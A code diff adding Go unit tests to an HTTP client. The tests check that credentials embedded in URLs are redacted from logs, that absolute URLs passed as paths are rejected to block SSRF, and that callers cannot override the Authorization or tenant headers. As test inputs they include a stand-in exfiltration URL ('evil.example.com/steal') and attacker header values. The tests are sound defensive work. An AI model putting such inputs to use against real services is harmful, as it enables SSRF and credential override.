@@ -243,3 +243,60 @@ func TestConcurrentRequestsGetUniqueRequestIDs(t *testing.T) {
 		t.Errorf("expected %d unique request IDs, got %d", n, len(seen))
 	}
 }
+
+// TestRedactPathStripsUserInfoAndFragment 验证 URL 中 UserInfo 与 Fragment
+// 不被写入日志,避免内嵌凭据泄露。
+func TestRedactPathStripsUserInfoAndFragment(t *testing.T) {
+	got := redactPath("https://user:pass@acc.kxpms.cn/v1/x#frag")
+	if strings.Contains(got, "user") || strings.Contains(got, "pass") || strings.Contains(got, "frag") {
+		t.Fatalf("redactPath leaked userinfo/fragment: %q", got)
+	}
+	if got != "/v1/x" {
+		t.Fatalf("redactPath wrong: %q", got)
+	}
+}
+
+// TestResolveURLRejectsAbsolutePath 防止 caller 把外部 URL 当 path 传入
+// 触发 SSRF / 跨域走私。
+func TestResolveURLRejectsAbsolutePath(t *testing.T) {
+	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer ts.Close()
+
+	c, err := New(Config{BaseURL: ts.URL, APIKey: "k"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := c.Get(context.Background(), "https://evil.example.com/steal", nil); err == nil {
+		t.Fatal("absolute path must be rejected")
+	}
+}
+
+// TestReservedHeaderCaseInsensitive 验证 caller 用小写 header 名也
+// 无法覆盖 Authorization / X-Pocket-Tenant / X-Pocket-Request-ID。
+func TestReservedHeaderCaseInsensitive(t *testing.T) {
+	var capturedAuth string
+	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		capturedAuth = r.Header.Get("Authorization")
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer ts.Close()
+
+	cfg := Config{BaseURL: ts.URL, APIKey: "real-token", TenantID: "tenant-1"}
+	c, err := New(cfg)
+	if err != nil {
+		t.Fatal(err)
+	}
+	hdr := map[string]string{
+		"authorization":       "Bearer ATTACKER",
+		"x-pocket-tenant":     "evil",
+		"x-pocket-request-id": "attacker-id",
+	}
+	if _, err := c.Get(context.Background(), "/probe", hdr); err != nil {
+		t.Fatal(err)
+	}
+	if capturedAuth != "Bearer real-token" {
+		t.Errorf("caller overrode Authorization (case-insensitive): %q", capturedAuth)
+	}
+}
